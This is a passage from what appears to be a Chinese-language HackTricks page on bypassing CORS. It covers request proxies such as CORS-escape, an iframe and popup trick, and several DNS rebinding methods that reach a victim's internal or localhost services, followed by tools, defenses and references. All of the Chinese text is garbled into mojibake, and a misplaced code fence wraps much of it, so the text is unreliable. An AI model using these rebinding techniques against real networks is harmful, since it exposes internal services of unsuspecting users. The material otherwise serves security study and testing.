ä½ å¯ä»¥è¯·æ±‚ä¸€ä¸ª web åº”ç”¨ä»£è¡¨ä½ å‘èµ·ä¸€ä¸ªè¯·æ±‚ï¼Œå¹¶å°†å“åº”å‘é€å›æ¥ã€‚è¿™å°†ç»•è¿‡ **`Access-Control-Allow-Origin`**ï¼Œä½†è¯·æ³¨æ„ï¼Œæœ€ç»ˆå—å®³è€…çš„ **å‡­æ®ä¸ä¼šè¢«å‘é€**ï¼Œå› ä¸ºä½ å°†ä¼š **è”ç³»ä¸€ä¸ªä¸åŒçš„åŸŸ**ï¼ˆå°†ä¸ºä½ å‘èµ·è¯·æ±‚çš„é‚£ä¸ªï¼‰ã€‚

[**CORS-escape**](https://github.com/shalvah/cors-escape)

CORS-escape æä¾›äº†ä¸€ä¸ª **ä»£ç†**ï¼Œå®ƒä¼š **ä¼ é€’** æˆ‘ä»¬çš„ **è¯·æ±‚** åŠå…¶ **å¤´éƒ¨**ï¼ŒåŒæ—¶è¿˜ä¼š **ä¼ªé€ ** **Origin** å¤´éƒ¨ï¼ˆOrigin = **è¯·æ±‚çš„åŸŸ**ï¼‰ã€‚å› æ­¤ï¼Œ**CORS ç­–ç•¥è¢«ç»•è¿‡**ã€‚\
æºä»£ç åœ¨ [Github ä¸Š](https://github.com/shalvah/cors-escape)ï¼Œæ‰€ä»¥ä½ å¯ä»¥ **è‡ªå·±æ‰˜ç®¡**ã€‚
```javascript
xhr.open("GET", "https://cors-escape.herokuapp.com/https://maximum.blog/@shalvah/posts");
```
```markdown
[**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape)

ä»£ç†æœ‰ç‚¹åƒâ€œä¼ é€’â€ä½ çš„è¯·æ±‚ï¼Œå®Œå…¨æŒ‰ç…§ä½ å‘é€çš„æ–¹å¼ã€‚æˆ‘ä»¬å¯ä»¥ç”¨å¦ä¸€ç§æ–¹å¼è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè¿™ç§æ–¹å¼ä»ç„¶æ¶‰åŠåˆ°åˆ«äººä»£ä½ å‘å‡ºè¯·æ±‚ï¼Œä½†è¿™æ¬¡ï¼Œ**æœåŠ¡å™¨ä¼šå‘å‡ºè‡ªå·±çš„è¯·æ±‚ï¼Œä½†ä½¿ç”¨ä½ æŒ‡å®šçš„ä»»ä½•å‚æ•°ã€‚**

### Iframe + å¼¹å‡ºçª—å£ç»•è¿‡

ä½ å¯ä»¥é€šè¿‡**åˆ›å»ºä¸€ä¸ªiframe**å’Œ**ä»ä¸­æ‰“å¼€ä¸€ä¸ªæ–°çª—å£**æ¥**ç»•è¿‡CORSæ£€æŸ¥**ã€‚æ›´å¤šä¿¡æ¯è¯·å‚è§ä»¥ä¸‹é¡µé¢ï¼š

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### é€šè¿‡TTLçš„DNSé‡ç»‘å®š

![](<../.gitbook/assets/image (108).png>)

åŸºæœ¬ä¸Šä½ è®©**å—å®³è€…è®¿é—®ä½ çš„é¡µé¢**ï¼Œç„¶åä½ æ›´æ”¹ä½ çš„**åŸŸåçš„DNSï¼ˆIPï¼‰**ï¼Œä½¿å…¶**æŒ‡å‘**ä½ çš„**å—å®³è€…çš„ç½‘é¡µ**ã€‚ä½ è®©ä½ çš„**å—å®³è€…åœ¨TTLç»“æŸæ—¶æ‰§è¡Œ**ï¼ˆ**JS**ï¼‰æŸäº›æ“ä½œï¼Œè¿™æ ·å°±ä¼šå‘å‡ºæ–°çš„DNSè¯·æ±‚ï¼Œç„¶åä½ å°±èƒ½å¤Ÿæ”¶é›†ä¿¡æ¯ï¼ˆå› ä¸ºä½ å°†**ç”¨æˆ·ä¿æŒåœ¨ä½ çš„åŸŸä¸­**ï¼Œä»–ä¸ä¼šå‘å—å®³è€…æœåŠ¡å™¨å‘é€**ä»»ä½•cookie**ï¼Œæ‰€ä»¥è¿™ä¸ªé€‰é¡¹**æ»¥ç”¨äº†å—å®³è€…IPçš„ç‰¹æ®Šæƒé™**ï¼‰ã€‚

å³ä½¿ä½ å°†**TTLè®¾ç½®å¾—éå¸¸ä½**ï¼ˆ0æˆ–1ï¼‰ï¼Œ**æµè§ˆå™¨æœ‰ç¼“å­˜**ä¼š**é˜»æ­¢**ä½ åœ¨å‡ ç§’é’Ÿ/åˆ†é’Ÿå†…**æ»¥ç”¨**è¿™ä¸€ç‚¹ã€‚

å› æ­¤ï¼Œè¿™ç§æŠ€æœ¯æœ‰åŠ©äº**ç»•è¿‡æ˜ç¡®çš„æ£€æŸ¥**ï¼ˆå—å®³è€…**æ˜ç¡®æ‰§è¡ŒDNSè¯·æ±‚**ä»¥æ£€æŸ¥åŸŸçš„IPï¼Œå½“æœºå™¨äººè¢«è°ƒç”¨æ—¶ï¼Œä»–å°†è¿›è¡Œè‡ªå·±çš„è¯·æ±‚ï¼‰ã€‚

æˆ–è€…å½“ä½ å¯ä»¥è®©ä¸€ä¸ª**ç”¨æˆ·/æœºå™¨äººåœ¨åŒä¸€ä¸ªé¡µé¢ä¸Šåœç•™å¾ˆé•¿æ—¶é—´**ï¼ˆè¿™æ ·ä½ å°±å¯ä»¥**ç­‰å¾…**ç›´åˆ°**ç¼“å­˜è¿‡æœŸ**ï¼‰ã€‚

å¦‚æœä½ éœ€è¦å¿«é€Ÿåˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œä½ å¯ä»¥ä½¿ç”¨åƒ[https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html)è¿™æ ·çš„æœåŠ¡ã€‚

å¦‚æœä½ æƒ³è¿è¡Œä½ è‡ªå·±çš„DNSé‡ç»‘å®šæœåŠ¡å™¨ï¼Œä½ å¯ä»¥ä½¿ç”¨åƒ[**DNSrebinder**](https://github.com/mogwailabs/DNSrebinder)**ï¼Œ**ç„¶å**æš´éœ²**ä½ çš„**æœ¬åœ°ç«¯å£53/udp**ï¼Œåˆ›å»ºä¸€ä¸ª**æŒ‡å‘å®ƒçš„Aè®°å½•**ï¼ˆns.example.comï¼‰ï¼Œå¹¶åˆ›å»ºä¸€ä¸ª**æŒ‡å‘ä¹‹å‰åˆ›å»ºçš„Aå­åŸŸçš„NSè®°å½•**ï¼ˆns.example.comï¼‰ã€‚\
ç„¶åï¼Œè¯¥å­åŸŸçš„ä»»ä½•å­åŸŸï¼ˆns.example.comï¼‰ï¼Œéƒ½å°†ç”±ä½ çš„ä¸»æœºè§£æã€‚

ä¹Ÿå¯ä»¥æŸ¥çœ‹åœ¨[**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)è¿è¡Œçš„**å…¬å…±æœåŠ¡å™¨**ã€‚

### é€šè¿‡**DNSç¼“å­˜æ³›æ»¥**çš„DNSé‡ç»‘å®š

å¦‚å‰ä¸€èŠ‚æ‰€è¿°ï¼Œ**æµè§ˆå™¨**ä¼šå°†åŸŸçš„IP**ç¼“å­˜æ›´é•¿æ—¶é—´**ï¼Œè¶…è¿‡TTLä¸­æŒ‡å®šçš„æ—¶é—´ã€‚ç„¶è€Œï¼Œæœ‰ä¸€ç§æ–¹æ³•å¯ä»¥ç»•è¿‡è¿™ç§é˜²å¾¡ã€‚

ä½ å¯ä»¥æœ‰ä¸€ä¸ªæœåŠ¡å·¥ä½œå™¨ï¼Œå®ƒå°†**æ³›æ»¥DNSç¼“å­˜ä»¥å¼ºåˆ¶è¿›è¡Œç¬¬äºŒæ¬¡DNSè¯·æ±‚**ã€‚æ‰€ä»¥æµç¨‹å°†ä¼šæ˜¯è¿™æ ·çš„ï¼š

1. DNSè¯·æ±‚å“åº”æ”»å‡»è€…åœ°å€
2. æœåŠ¡å·¥ä½œå™¨æ³›æ»¥DNSç¼“å­˜ï¼ˆç¼“å­˜çš„æ”»å‡»è€…æœåŠ¡å™¨åç§°è¢«åˆ é™¤ï¼‰
3. ç¬¬äºŒæ¬¡DNSè¯·æ±‚è¿™æ¬¡å“åº”ä¸º127.0.0.1

![](<../.gitbook/assets/image (375) (1).png>)

_è“è‰²æ˜¯ç¬¬ä¸€æ¬¡DNSè¯·æ±‚ï¼Œæ©™è‰²æ˜¯æ³›æ»¥ã€‚_

### é€šè¿‡**ç¼“å­˜**çš„DNSé‡ç»‘å®š

å¦‚å‰ä¸€èŠ‚æ‰€è¿°ï¼Œ**æµè§ˆå™¨**ä¼šå°†åŸŸçš„IP**ç¼“å­˜æ›´é•¿æ—¶é—´**ï¼Œè¶…è¿‡TTLä¸­æŒ‡å®šçš„æ—¶é—´ã€‚ç„¶è€Œï¼Œè¿˜æœ‰å¦ä¸€ç§æ–¹æ³•å¯ä»¥ç»•è¿‡è¿™ç§é˜²å¾¡ã€‚

ä½ å¯ä»¥åœ¨**DNSæä¾›å•†**ä¸­ä¸º**åŒä¸€ä¸ªå­åŸŸ**åˆ›å»º**2ä¸ªAè®°å½•**ï¼ˆæˆ–**1ä¸ªå¸¦æœ‰2ä¸ªIP**ï¼Œå–å†³äºæä¾›å•†ï¼‰ï¼Œå½“æµè§ˆå™¨æ£€æŸ¥å®ƒä»¬æ—¶ï¼Œä»–å°†è·å¾—ä¸¤è€…ã€‚

ç°åœ¨ï¼Œå¦‚æœ**æµè§ˆå™¨**å†³å®š**é¦–å…ˆä½¿ç”¨æ”»å‡»è€…IPåœ°å€**ï¼Œ**æ”»å‡»è€…**å°†èƒ½å¤Ÿ**æä¾›**å°†**æ‰§è¡ŒHTTPè¯·æ±‚**åˆ°åŒä¸€ä¸ª**åŸŸ**çš„**æœ‰æ•ˆè½½è·**ã€‚ç„¶è€Œï¼Œç°åœ¨æ”»å‡»è€…çŸ¥é“äº†å—å®³è€…çš„IPï¼Œ**ä»–å°†åœæ­¢å›ç­”å—å®³è€…æµè§ˆå™¨**ã€‚

å½“æµè§ˆå™¨å‘ç°**åŸŸæ²¡æœ‰å“åº”**æ—¶ï¼Œå®ƒå°†**ä½¿ç”¨ç¬¬äºŒä¸ªç»™å®šçš„IP**ï¼Œæ‰€ä»¥ä»–å°†**è®¿é—®ä¸€ä¸ªä¸åŒçš„åœ°æ–¹ç»•è¿‡SOP**ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥**è·å–ä¿¡æ¯å¹¶æ³„éœ²å®ƒ**ã€‚

{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œä¸ºäº†è®¿é—®localhostï¼Œä½ åº”è¯¥å°è¯•åœ¨Windowsä¸­é‡æ–°ç»‘å®š**127.0.0.1**ï¼Œåœ¨linuxä¸­é‡æ–°ç»‘å®š**0.0.0.0**ã€‚\
åƒgodaddyæˆ–cloudflareè¿™æ ·çš„æä¾›å•†ä¸å…è®¸æˆ‘ä½¿ç”¨ip 0.0.0.0ï¼Œä½†AWS route53å…è®¸æˆ‘åˆ›å»ºä¸€ä¸ªå¸¦æœ‰2ä¸ªIPçš„Aè®°å½•ï¼Œå…¶ä¸­ä¸€ä¸ªæ˜¯"0.0.0.0"

<img src="../.gitbook/assets/image (638) (2) (1) (1) (1).png" alt="" data-size="original">
{% endhint %}

![](<../.gitbook/assets/image (620) (4).png>)

æ›´å¤šä¿¡æ¯å¯ä»¥æŸ¥çœ‹[https://unit42.paloaltonetworks.com/dns-rebinding/](https://unit42.paloaltonetworks.com/dns-rebinding/)

### å…¶ä»–å¸¸è§ç»•è¿‡æ–¹æ³•

* å¦‚æœ**ä¸å…è®¸å†…éƒ¨IP**ï¼Œä»–ä»¬å¯èƒ½**å¿˜è®°ç¦æ­¢0.0.0.0**ï¼ˆåœ¨Linuxå’ŒMacä¸Šæœ‰æ•ˆï¼‰
* å¦‚æœ**ä¸å…è®¸å†…éƒ¨IP**ï¼Œç”¨**CNAME**å“åº”æŒ‡å‘**localhost**ï¼ˆåœ¨Linuxå’ŒMacä¸Šæœ‰æ•ˆï¼‰
* å¦‚æœ**ä¸å…è®¸å†…éƒ¨IP**ä½œä¸ºDNSå“åº”ï¼Œä½ å¯ä»¥å“åº”æŒ‡å‘å†…éƒ¨æœåŠ¡çš„**CNAME**ï¼Œä¾‹å¦‚www.corporate.internalã€‚

### æ­¦å™¨åŒ–çš„DNSé‡ç»‘å®š

ä½ å¯ä»¥åœ¨[Gerald Doussot - State of DNS Rebinding Attacks & Singularity of Origin - DEF CON 27 Conference](https://www.youtube.com/watch?v=y9-0lICNjOQ)çš„æ¼”è®²ä¸­æ‰¾åˆ°æ›´å¤šå…³äºå‰é¢ç»•è¿‡æŠ€æœ¯çš„ä¿¡æ¯ä»¥åŠå¦‚ä½•ä½¿ç”¨ä»¥ä¸‹å·¥å…·ã€‚

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity)æ˜¯ä¸€ä¸ªæ‰§è¡Œ[DNSé‡ç»‘å®š](https://en.wikipedia.org/wiki/DNS\_rebinding)æ”»å‡»çš„å·¥å…·ã€‚å®ƒåŒ…æ‹¬å°†æ”»å‡»æœåŠ¡å™¨DNSåç§°çš„IPåœ°å€é‡æ–°ç»‘å®šåˆ°ç›®æ ‡æœºå™¨çš„IPåœ°å€æ‰€éœ€çš„ç»„ä»¶ï¼Œå¹¶æä¾›æ”»å‡»æœ‰æ•ˆè½½è·ä»¥åˆ©ç”¨ç›®æ ‡æœºå™¨ä¸Šçš„æ˜“å—æ”»å‡»è½¯ä»¶ã€‚

### é’ˆå¯¹DNSé‡ç»‘å®šçš„çœŸæ­£ä¿æŠ¤

* åœ¨å†…éƒ¨æœåŠ¡ä¸­ä½¿ç”¨TLS
* è¯·æ±‚è®¤è¯ä»¥è®¿é—®æ•°æ®
* éªŒè¯Hostå¤´
* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/)ï¼šææ¡ˆï¼Œå½“å…¬å…±æœåŠ¡å™¨æƒ³è¦è®¿é—®å†…éƒ¨æœåŠ¡å™¨æ—¶ï¼Œæ€»æ˜¯å‘é€ä¸€ä¸ªé¢„æ£€è¯·æ±‚

## **å·¥å…·**

**æ¨¡ç³Šå¯èƒ½çš„CORSç­–ç•¥é…ç½®é”™è¯¯**

* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)

## å‚è€ƒèµ„æ–™

{% embed url="https://portswigger.net/web-security/cors" %}

{% embed url="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS" %}

{% embed url="https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties" %}

{% embed url="https://www.codecademy.com/articles/what-is-cors" %}

{% embed url="https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors" %}

{% embed url="https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration" %}

{% embed url="https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»åˆ°é«˜æ‰‹ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°ä½ çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**telegramç¾¤ç»„**](https://t.me/peass)æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚

</details>
```
